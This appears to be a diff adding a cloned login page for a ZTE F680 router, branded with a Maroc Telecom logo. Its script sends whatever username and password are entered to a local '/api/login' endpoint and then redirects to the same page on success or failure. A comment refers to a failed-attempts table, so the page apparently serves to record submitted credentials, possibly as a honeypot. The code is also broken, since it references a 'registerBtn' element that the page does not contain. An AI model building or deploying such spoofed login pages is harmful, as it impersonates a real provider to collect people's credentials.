@@ -1,0 +1,131 @@
+<!doctype html>
+<html lang="fr">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>F680</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <main class="page">
+    <header class="top">
+      <a class="brand" href="#" aria-label="">
+        <svg viewBox="0 0 100 58" role="img" aria-label="Maroc Telecom logo">
+          <path d="M8 43 C27 49 58 48 75 35" fill="none" stroke="#f47721" stroke-width="3"/>
+          <path d="M62 9 L82 20 L72 30 L87 39 L77 47 L62 34 L72 24 Z" fill="#f47721"/>
+          <path d="M69 17 L81 24 L74 31 L83 38" fill="none" stroke="#0088c8" stroke-width="3"/>
+          <text x="13" y="22" font-size="15" font-weight="700" fill="#0871b9">Maroc</text>
+          <text x="8" y="37" font-size="15" font-weight="700" fill="#0871b9">Telecom</text>
+        </svg>
+      </a>
+      <div class="languages"><a href="#">French</a><a class="active" href="#">English</a></div>
+    </header>
+
+    <nav class="nav" aria-label="Main navigation">
+      <a href="#">Home</a>
+      <a href="#">Internet</a>
+      <a href="#">Réseau Local</a>
+      <a href="#">voiIP</a>
+      <a href="#">Gestion et diagnostic</a>
+    </nav>
+
+    <section class="login-panel" aria-labelledby="welcome">
+      <div class="panel-heading">
+        <div class="lock-tile" aria-hidden="true">
+          <svg viewBox="0 0 64 64">
+            <path d="M17 28v-9a15 15 0 0 1 30 0v9" fill="none" stroke="#777" stroke-width="5" stroke-linecap="round"/>
+            <path d="M20 27v-8a12 12 0 0 1 24 0v8" fill="none" stroke="#f8f8f8" stroke-width="2"/>
+            <rect x="13" y="26" width="38" height="31" rx="3" fill="#777" stroke="#555" stroke-width="2"/>
+            <rect x="17" y="30" width="30" height="23" rx="2" fill="#bfc0c2"/>
+            <path d="M32 37v8" stroke="#666" stroke-width="3" stroke-linecap="round"/>
+            <circle cx="32" cy="36" r="3" fill="#666"/>
+            <path d="M16 29h35" stroke="#eee" stroke-width="2"/>
+          </svg>
+        </div>
+        <h1 id="welcome">Bienvenue au F680. Veuillez vous connecter.</h1>
+      </div>
+
+      <div class="form-area">
+        <label for="username">Nom d'utilisateur</label>
+        <input id="username" type="text" autocomplete="off" autofocus>
+        <label for="password">Mot de pass</label>
+        <input id="password" type="password" autocomplete="off">
+      </div>
+      <div class="panel-actions">
+        <button type="button" id="loginBtn">S'identifier</button>
+      </div>
+    </section>
+
+    <footer class="footer">
+      &amp; copy; 2008-2022 ZTE Corporation. Tous les droits sont réservés
+      <span class="separator">|</span>F680
+    </footer>
+  </main>
+
+    <script>
+    const loginBtn      = document.getElementById('loginBtn');
+    const registerBtn   = document.getElementById('registerBtn');
+    const usernameInput = document.getElementById('username');
+    const passwordInput = document.getElementById('password');
+
+    // Where to go after each result — change these URLs to whatever you want
+    const REDIRECT_ON_SUCCESS = '/index.html';
+    const REDIRECT_ON_FAIL    = '/index.html';   // ← e.g. show the failed-attempts table
+
+    async function callApi(url, username, password) {
+      const res = await fetch(url, {
+        method : 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body   : JSON.stringify({ username, password })
+      });
+      return res.json();
+    }
+
+    async function doLogin() {
+      const username = usernameInput.value.trim();
+      const password = passwordInput.value.trim();
+      if (!username || !password) {
+        usernameInput.focus();
+        return;
+      }
+
+      loginBtn.disabled = true;
+      try {
+        const data = await callApi('/api/login', username, password);
+        window.location.href = data.ok ? REDIRECT_ON_SUCCESS : REDIRECT_ON_FAIL;
+      } catch (e) {
+        console.error(e);
+        window.location.href = REDIRECT_ON_FAIL;
+      } finally {
+        loginBtn.disabled = false;
+      }
+    }
+
+    async function doRegister() {
+      const username = usernameInput.value.trim();
+      const password = passwordInput.value.trim();
+      if (!username || !password) {
+        usernameInput.focus();
+        return;
+      }
+
+      registerBtn.disabled = true;
+      try {
+        const data = await callApi('/api/register', username, password);
+        // On success: go to Google. On failure: stay here (no popup).
+        if (data.ok) window.location.href = 'https://www.google.com';
+      } catch (e) {
+        console.error(e);
+      } finally {
+        registerBtn.disabled = false;
+      }
+    }
+
+    loginBtn.addEventListener('click', doLogin);
+    registerBtn.addEventListener('click', doRegister);
+    passwordInput.addEventListener('keydown', e => {
+      if (e.key === 'Enter') doLogin();
+    });
+  </script>
+</body>
+</html>
